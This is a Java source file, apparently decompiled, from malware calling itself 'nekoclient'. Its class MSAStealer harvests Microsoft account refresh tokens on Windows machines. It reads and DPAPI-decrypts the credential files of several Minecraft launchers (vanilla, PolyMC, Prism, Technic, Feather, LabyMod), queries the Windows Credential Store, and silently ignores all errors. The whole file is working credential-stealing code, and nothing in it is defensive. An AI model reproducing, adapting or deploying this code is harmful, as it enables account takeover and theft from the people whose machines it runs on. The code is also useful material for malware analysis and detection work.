package dev.neko.nekoclient.api.stealer.msa.impl;

import com.eclipsesource.json.Json;
import com.eclipsesource.json.JsonObject;
import com.eclipsesource.json.JsonValue;
import com.google.api.client.auth.oauth2.StoredCredential;
import com.sun.jna.Platform;
import com.sun.jna.platform.win32.Crypt32Util;
import dev.neko.nekoclient.api.stealer.msa.auth.ClientType;
import dev.neko.nekoclient.api.windows.WindowsHook;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Objects;
import java.util.regex.Pattern;
import java.util.stream.Collectors;

public class MSAStealer {
   public static List<MSAStealer.RefreshToken> retrieveRefreshTokens() {
      List<MSAStealer.RefreshToken> refreshTokens = new ArrayList<>();

      try {
         retrieveRefreshTokensFromUWPMinecraftLauncher(refreshTokens);
      } catch (Throwable var9) {
      }

      try {
         retrieveRefreshTokensFromCredentialStore(refreshTokens);
      } catch (Throwable var8) {
      }

      try {
         retrieveRefreshTokensFromLegacyMinecraftLauncher(refreshTokens);
      } catch (Throwable var7) {
      }

      try {
         retrieveRefreshTokensFromPolyMC(refreshTokens);
      } catch (Throwable var6) {
      }

      try {
         retrieveRefreshTokensFromTechnicLauncher(refreshTokens);
      } catch (Throwable var5) {
      }

      try {
         retrieveRefreshTokensFromPrismLauncher(refreshTokens);
      } catch (Throwable var4) {
      }

      try {
         retrieveRefreshTokensFromFeatherLauncher(refreshTokens);
      } catch (Throwable var3) {
      }

      try {
         retrieveRefreshTokensFromLabyMod(refreshTokens);
      } catch (Throwable var2) {
      }

      return refreshTokens;
   }

   private static void retrieveRefreshTokensFromLabyMod(List<MSAStealer.RefreshToken> refreshTokens) throws IOException {
      if (Platform.isWindows() && !Objects.isNull(System.getenv("APPDATA"))) {
         Path path = Objects.isNull(System.getenv("APPDATA")) ? null : Paths.get(System.getenv("APPDATA"), ".minecraft", "LabyMod", "accounts.json");
         if (Files.exists(path) && Files.isReadable(path)) {
            extractRefreshTokensFromLabyModLauncher(refreshTokens, Json.parse(new String(Files.readAllBytes(path))).asObject());
         }
      }
   }

   public static void retrieveRefreshTokensFromFeatherLauncher(List<MSAStealer.RefreshToken> refreshTokens) throws IOException {
      if (Platform.isWindows() && !Objects.isNull(System.getenv("APPDATA"))) {
         Path path = Objects.isNull(System.getenv("APPDATA")) ? null : Paths.get(System.getenv("APPDATA"), ".feather", "accounts.json");
         if (Files.exists(path) && Files.isReadable(path)) {
            extractRefreshTokensFromFeatherLauncher(refreshTokens, Json.parse(new String(Files.readAllBytes(path))).asObject());
         }
      }
   }

   private static void retrieveRefreshTokensFromPolyMC(List<MSAStealer.RefreshToken> refreshTokens) throws IOException {
      if (Platform.isWindows() && !Objects.isNull(System.getenv("APPDATA"))) {
         Path path = Objects.isNull(System.getenv("APPDATA")) ? null : Paths.get(System.getenv("APPDATA"), "PolyMC", "accounts.json");
         if (Files.exists(path) && Files.isReadable(path)) {
            extractRefreshTokensFromMultiMCLauncher(refreshTokens, Json.parse(new String(Files.readAllBytes(path))).asObject());
         }
      }
   }

   private static void retrieveRefreshTokensFromPrismLauncher(List<MSAStealer.RefreshToken> refreshTokens) throws IOException {
      if (Platform.isWindows() && !Objects.isNull(System.getenv("APPDATA"))) {
         Path path = Objects.isNull(System.getenv("APPDATA")) ? null : Paths.get(System.getenv("APPDATA"), "PrismLauncher", "accounts.json");
         if (Files.exists(path) && Files.isReadable(path)) {
            extractRefreshTokensFromMultiMCLauncher(refreshTokens, Json.parse(new String(Files.readAllBytes(path))).asObject());
         }
      }
   }

   private static void retrieveRefreshTokensFromTechnicLauncher(List<MSAStealer.RefreshToken> refreshTokens) throws IOException, ClassNotFoundException {
      if (Platform.isWindows() && !Objects.isNull(System.getenv("APPDATA"))) {
         Path path = Objects.isNull(System.getenv("APPDATA")) ? null : Paths.get(System.getenv("APPDATA"), ".technic", "oauth", "StoredCredential");
         if (Files.exists(path) && Files.isReadable(path)) {
            extractRefreshTokensFromTechnicLauncher(refreshTokens, path);
         }
      }
   }

   private static void retrieveRefreshTokensFromUWPMinecraftLauncher(List<MSAStealer.RefreshToken> refreshTokens) throws IOException {
      if (Platform.isWindows() && !Objects.isNull(System.getenv("APPDATA"))) {
         Path path = Objects.isNull(System.getenv("APPDATA"))
            ? null
            : Paths.get(System.getenv("APPDATA"), ".minecraft", "launcher_msa_credentials_microsoft_store.bin");
         if (Files.exists(path) && Files.isReadable(path)) {
            extractRefreshTokensFromVanillaLauncher(refreshTokens, Json.parse(new String(Crypt32Util.cryptUnprotectData(Files.readAllBytes(path)))).asObject());
         }
      }
   }

   private static void retrieveRefreshTokensFromLegacyMinecraftLauncher(List<MSAStealer.RefreshToken> refreshTokens) throws IOException {
      if (Platform.isWindows() && !Objects.isNull(System.getenv("APPDATA"))) {
         Path path = Objects.isNull(System.getenv("APPDATA")) ? null : Paths.get(System.getenv("APPDATA"), ".minecraft", "launcher_msa_credentials.bin");
         if (Files.exists(path) && Files.isReadable(path)) {
            extractRefreshTokensFromVanillaLauncher(refreshTokens, Json.parse(new String(Crypt32Util.cryptUnprotectData(Files.readAllBytes(path)))).asObject());
         }
      }
   }

   private static void retrieveRefreshTokensFromCredentialStore(List<MSAStealer.RefreshToken> refreshTokens) {
      if (WindowsHook.isAvailable()) {
         byte[][] credentials = WindowsHook.retrieveMSACredentials();

         for(byte[] credential : credentials) {
            JsonObject msaAccount = Json.parse(new String(credential).substring(60)).asObject();
            if (Objects.isNull(msaAccount.get("refresh_token"))) {
               return;
            }

            MSAStealer.RefreshToken refreshToken = new MSAStealer.RefreshToken(msaAccount.get("refresh_token").asString(), ClientType.DEFAULT);
            if (!refreshTokens.contains(refreshToken)) {
               refreshTokens.add(refreshToken);
            }
         }
      }
   }

   private static void extractRefreshTokensFromTechnicLauncher(List<MSAStealer.RefreshToken> refreshTokens, Path path) throws IOException, ClassNotFoundException {
      HashMap<String, byte[]> storedCredential = (HashMap)new ObjectInputStream(Files.newInputStream(path)).readObject();
      storedCredential.forEach((username, object) -> {
         try {
            StoredCredential credential = (StoredCredential)new ObjectInputStream(new ByteArrayInputStream(object)).readObject();
            MSAStealer.RefreshToken refreshToken = new MSAStealer.RefreshToken(credential.getRefreshToken(), ClientType.TECHNIC_LAUNCHER);
            if (!refreshTokens.contains(refreshToken)) {
               refreshTokens.add(refreshToken);
            }
         } catch (IOException | ClassNotFoundException | ClassCastException var5) {
         }
      });
   }

   private static void extractRefreshTokensFromVanillaLauncher(List<MSAStealer.RefreshToken> refreshTokens, JsonObject json) {
      if (!Objects.isNull(json.get("credentials"))) {
         Pattern msaPattern = Pattern.compile("^Xal\\.\\d+\\.Production\\.Msa\\..+$");
         Pattern credentialNamePattern = Pattern.compile("^\\d+$");
         JsonObject credentialsObject = json.get("credentials").asObject();

         for(JsonObject credential : credentialsObject.names()
            .stream()
            .filter(s -> credentialNamePattern.matcher(s).matches())
            .map(credentialsObject::get)
            .map(JsonValue::asObject)
            .collect(Collectors.toList())) {
            JsonObject msaAccountData = credential.names()
               .stream()
               .filter(s -> msaPattern.matcher(s).matches())
               .map(credential::get)
               .map(JsonValue::asString)
               .map(Json::parse)
               .map(JsonValue::asObject)
               .findFirst()
               .orElse(null);
            if (!Objects.isNull(msaAccountData) && !Objects.isNull(msaAccountData.get("refresh_token"))) {
               MSAStealer.RefreshToken refreshToken = new MSAStealer.RefreshToken(msaAccountData.get("refresh_token").asString(), ClientType.DEFAULT);
               if (!refreshTokens.contains(refreshToken)) {
                  refreshTokens.add(refreshToken);
               }
            }
         }
      }
   }

   private static void extractRefreshTokensFromMultiMCLauncher(List<MSAStealer.RefreshToken> refreshTokens, JsonObject json) {
      if (!Objects.isNull(json.get("accounts"))) {
         for(JsonObject account : json.get("accounts").asArray().values().stream().map(JsonValue::asObject).collect(Collectors.toList())) {
            if (!Objects.isNull(account.get("msa")) && !Objects.isNull(account.get("msa-client-id"))) {
               JsonObject msa = account.get("msa").asObject();
               if (!Objects.isNull(msa.get("refresh_token"))) {
                  MSAStealer.RefreshToken refreshToken = new MSAStealer.RefreshToken(
                     msa.get("refresh_token").asString(), new ClientType(account.get("msa-client-id").asString(), "XboxLive.signin offline_access", "d")
                  );
                  if (!refreshTokens.contains(refreshToken)) {
                     refreshTokens.add(refreshToken);
                  }
               }
            }
         }
      }
   }

   private static void extractRefreshTokensFromFeatherLauncher(List<MSAStealer.RefreshToken> refreshTokens, JsonObject json) {
      if (!Objects.isNull(json.get("ms"))) {
         for(JsonObject account : json.get("ms").asArray().values().stream().map(JsonValue::asObject).collect(Collectors.toList())) {
            if (!Objects.isNull(account.get("refreshToken"))) {
               MSAStealer.RefreshToken refreshToken = new MSAStealer.RefreshToken(account.get("refreshToken").asString(), ClientType.DEFAULT);
               if (!refreshTokens.contains(refreshToken)) {
                  refreshTokens.add(refreshToken);
               }
            }
         }
      }
   }

   private static void extractRefreshTokensFromLabyModLauncher(List<MSAStealer.RefreshToken> refreshTokens, JsonObject json) {
      if (!Objects.isNull(json.get("accounts"))) {
         JsonObject accounts = json.get("accounts").asObject();

         for(JsonObject account : accounts.names().stream().map(accounts::get).map(JsonValue::asObject).collect(Collectors.toList())) {
            if (!Objects.isNull(account.get("tokens"))) {
               JsonObject tokens = account.get("tokens").asObject();
               if (!Objects.isNull(tokens.get("microsoft"))) {
                  JsonObject microsoft = tokens.get("microsoft").asObject();
                  if (!Objects.isNull(microsoft.get("additional_data"))) {
                     JsonObject additionalData = microsoft.get("additional_data").asObject();
                     if (!Objects.isNull(additionalData.get("refresh_token"))) {
                        MSAStealer.RefreshToken refreshToken = new MSAStealer.RefreshToken(additionalData.get("refresh_token").asString(), ClientType.LABYMOD);
                        if (!refreshTokens.contains(refreshToken)) {
                           refreshTokens.add(refreshToken);
                        }
                     }
                  }
               }
            }
         }
      }
   }

   public static class RefreshToken {
      private final String token;
      private final ClientType clientType;

      public RefreshToken(String token, ClientType clientType) {
         this.token = token;
         this.clientType = clientType;
      }

      public final String getToken() {
         return this.token;
      }

      public final ClientType getClientType() {
         return this.clientType;
      }

      @Override
      public boolean equals(Object obj) {
         if (!(obj instanceof MSAStealer.RefreshToken)) {
            return super.equals(obj);
         } else {
            MSAStealer.RefreshToken other = (MSAStealer.RefreshToken)obj;
            return Objects.equals(other.getToken(), this.token) && Objects.equals(other.getClientType().getClientId(), this.clientType.getClientId());
         }
      }
   }
}
